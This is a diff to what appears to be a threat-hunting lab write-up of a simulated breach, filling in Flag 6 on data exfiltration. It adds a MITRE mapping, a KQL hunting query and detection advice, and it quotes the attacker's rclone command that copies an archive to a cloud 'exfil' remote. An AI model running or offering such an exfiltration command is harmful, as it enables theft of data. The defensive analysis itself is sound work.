@@ -124,7 +124,7 @@ A security breach was identified within EmberForge Studios, prompting a focused 
 | 3 | MITRE ATT&CK: T1552.001 – Credentials in Files| T1552 – Unsecured Credentials. | <Placeholder> |
 | 4 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 5 | MITRE ATT&CK: T1567.002 – Exfiltration to Cloud Storage| T1567 – Exfiltration Over Web Service.| <Placeholder> |
-| 6 | <Placeholder> | <Placeholder> | <Placeholder> |
+| 6 | MITRE ATT&CK: T1041 – Exfiltration Over C2 Channel | T1041 – Exfiltration Over C2 Channel | <Placeholder> |
 | 7 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 8 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 9 | <Placeholder> | <Placeholder> | <Placeholder> |
@@ -424,34 +424,43 @@ Search for repeated executions of the same tool within short timeframes, especia
 <summary id="-flag-6">🚩 <strong>Flag 6: <Technique Name></strong></summary>
 
 ### 🎯 Objective
-<What the attacker was trying to accomplish>
+Transmit stolen data to an external destination by establishing outbound network connections during exfiltration.
 
 ### 📌 Finding
-<High-level description of the activity>
+The attacker used `rclone.exe` to initiate outbound network communication to a remote IP address, confirming active data exfiltration over the network.
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
+| Host | EC2AMAZ-16V3AU4.emberforge.local |
+| Timestamp | 2026-01-30 23:XX:XX UTC |
+| Process | rclone.exe |
+| Parent Process | cmd.exe (likely) |
+| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v |
 
 ### 💡 Why it matters
-<Explain impact, risk, and relevance>
+This confirms that data was successfully transmitted outside the environment to the IP address **66.203.125.15**, validating that exfiltration was not just attempted but executed. Correlating process execution with network activity provides strong evidence of compromise and helps defenders identify both the tool and destination used by the attacker, which is critical for containment and blocking.
+
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+EmberForgeX_CL
+| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
+| where EventCode_s == "3"
+| where Image_s has "rclone.exe"
+| project UtcTime_s, Computer, Image_s, DestinationIp_s, DestinationPort_s
+| summarize count() by DestinationIp_s
+| order by count_ desc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="1622" height="640" alt="image" src="https://github.com/user-attachments/assets/03a92ce9-7029-4307-8774-02021539f02d" />
+
 
 ### 🛠️ Detection Recommendation
+Implement detections that correlate process execution (Sysmon Event ID 1) with outbound network connections (Event ID 3), especially for tools like `rclone.exe`. Alert on unusual outbound connections to external IPs from non-standard directories and flag traffic to known cloud storage or suspicious infrastructure.
 
 **Hunting Tip:**  
-<Actionable guidance for defenders>
+Pivot between process creation and network connection events using common fields like host and timestamp. Look for processes initiating external connections shortly after execution—this is a strong indicator of data exfiltration or command-and-control activity.
 
 </details>
 
